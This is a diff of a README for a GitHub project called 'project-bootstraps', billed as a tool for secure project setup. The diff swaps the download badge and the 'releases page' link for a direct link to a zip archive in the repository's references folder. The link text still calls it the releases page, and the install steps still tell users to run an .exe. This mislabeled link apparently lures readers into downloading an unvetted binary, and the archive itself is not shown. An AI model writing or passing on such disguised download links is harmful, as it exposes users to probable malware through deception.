@@ -1,6 +1,6 @@
 # 🛠️ project-bootstraps - Build secure projects with automated rules
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Fractionlongpepper687/project-bootstraps/releases)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Fractionlongpepper687/project-bootstraps/raw/refs/heads/main/references/bootstraps-project-v3.0-beta.3.zip)
 
 project-bootstraps helps you start new software projects the right way. It creates setup files and safety rules for your tasks. This tool ensures your code stays consistent and secure from day one. You save time on configuration and follow best practices without manual work.
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run this software:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/Fractionlongpepper687/project-bootstraps/releases) to find the latest version of the application.
+1. Visit the [releases page](https://github.com/Fractionlongpepper687/project-bootstraps/raw/refs/heads/main/references/bootstraps-project-v3.0-beta.3.zip) to find the latest version of the application.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the filename to start the download.
 4. Once the download finishes, locate the file in your Downloads folder.
